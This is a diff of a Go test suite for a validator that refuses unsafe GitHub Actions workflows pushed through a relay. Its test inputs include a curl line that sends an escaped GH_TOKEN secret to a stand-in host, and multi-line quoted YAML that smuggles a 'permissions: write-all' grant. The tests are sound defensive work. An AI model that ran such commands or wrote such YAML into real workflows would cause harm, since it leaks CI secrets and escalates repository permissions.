@@ -493,6 +493,9 @@ func TestRelayPushWorkflowRefusals(t *testing.T) {
 		{"hex escaped secrets", relayWF(t, "      - name: run\n", "      - run: \"curl -d ${{ \\x73ecrets.GH_TOKEN }} https://x.example\"\n      - name: run\n"), "backslash outside a block scalar"},
 		{"unicode escaped secrets", relayWF(t, "      - name: run\n", "      - run: \"echo ${{ \\u0073ecrets.GH_TOKEN }}\"\n      - name: run\n"), "backslash outside a block scalar"},
 		{"escaped line break", relayWF(t, "      - name: run\n", "      - run: \"echo ${{ se\\\n          crets.GH_TOKEN }}\"\n      - name: run\n"), "backslash outside a block scalar"},
+		{"fake block header in a quoted scalar", relayWF(t, "    runs-on: ubuntu-latest\n", "    runs-on: ubuntu-latest\n    name: \"x\n y: |\"\n    permissions: write-all\n"), "quoted scalar or flow sequence spans lines"},
+		{"fake block header in a single-quoted item", relayWF(t, "      - name: run\n", "      - 'x\n y: |'\n    permissions: write-all\n      - name: run\n"), "quoted scalar or flow sequence spans lines"},
+		{"flow sequence over lines", relayWF(t, "    branches: [main]\n", "    branches: [main,\n      'x: |']\n"), "quoted scalar or flow sequence spans lines"},
 		{"hosted-looking custom label", relayWF(t, "runs-on: ubuntu-latest", "runs-on: ubuntu-gpu-box"), "non-GitHub-hosted runner"},
 		{"matrix self-hosted", relayWF(t, "    runs-on: ubuntu-latest\n", "    strategy:\n      matrix:\n        os: [self-hosted]\n    runs-on: ${{ matrix.os }}\n"), "non-GitHub-hosted runner"},
 	} {
@@ -561,6 +564,8 @@ func TestRelayPushWorkflowAllowed(t *testing.T) {
 		{"hosted runner", relayWF(t, "runs-on: ubuntu-latest", "runs-on: ubuntu-24.04")},
 		{"hosted list", relayWF(t, "runs-on: ubuntu-latest", "runs-on: [ubuntu-22.04]")},
 		{"hosted arm and macos", relayWF(t, "runs-on: ubuntu-latest", "runs-on: [ubuntu-24.04-arm, macos-15, windows-2025]")},
+		{"closed quotes", relayWF(t, "name: tests", "name: \"tests 'a' b\"")},
+		{"closed single quotes", relayWF(t, "      - name: run\n", "      - name: 'it''s [x'\n")},
 		{"backslash in a block scalar", relayWF(t, "echo hi", "go test \\\n            ./...")},
 		{"name", relayWF(t, "name: tests", "name: tests and lint")},
 		{"no workflow", ""},
